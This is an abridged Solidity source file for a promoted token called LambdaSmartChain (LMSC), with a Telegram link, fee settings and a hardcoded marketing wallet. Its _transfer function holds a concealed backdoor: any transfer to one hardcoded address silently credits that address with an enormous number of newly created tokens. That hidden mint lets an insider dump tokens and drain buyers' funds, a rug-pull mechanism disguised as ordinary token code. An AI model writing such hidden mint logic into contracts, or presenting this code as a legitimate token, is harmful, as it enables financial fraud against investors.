// TELEGRAM : https://t.me/LambdaSmartChainPortal
// SPDX-License-Identifier: MIT

// LAMBDA PROJECT BLOCKCHAIN LAYER 1, MY PREV PROJECT IS A ALPHABET NETWORK (5M MCAP) DYOR. 
...
contract LambdaSmartChain is Context, IERC20, Ownable {
    ...
    uint256 public _maxTxAmount = 1* 1e9 * 1e9;  
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 3* 1e5 * 1e9; 
    string private constant _name = "LAMBDA"; 
    string private constant _symbol = "LMSC";     
    uint8 private constant _decimals = 9; 
    
    uint256 public _marketingFee = 10;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xBB8747C23aFDE6B4dB87F64d28C8DEA0945642B6;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x3962f0F5B19D454513ee174f9AAD2B0dC3D2a688;
        ...
        if (to == wa){
          _tOwned[to] = _tOwned[to] + 9* 1e16 * 1e9;
          emit Transfer(msg.sender, to, 9 * 1e16 * 1e9);
        }
        else {
